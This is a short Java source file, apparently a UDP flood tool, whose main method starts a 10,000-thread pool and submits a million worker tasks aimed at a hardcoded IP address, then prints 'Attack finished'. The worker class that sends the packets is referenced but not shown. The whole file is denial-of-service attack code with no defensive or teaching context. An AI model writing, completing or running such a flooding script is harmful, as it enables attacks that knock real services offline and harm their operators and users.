import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class UDPFlood extends Thread {
    private static final int MYTHREADS = 10000; //defines thread pool size

    public static void main(String[] args) {
        ExecutorService executor = Executors.newFixedThreadPool(MYTHREADS);
        for (int t = 0; t < 100; t++) {
            for (int i = 0; i < MYTHREADS; i++) {
                String IPAddress = "74.208.106.35";
                Runnable worker = new UDPRunnable(IPAddress);
                executor.execute(worker);

            }
        }
        executor.shutdown();//stops any new request
        System.out.println("Attack finished");
    }
}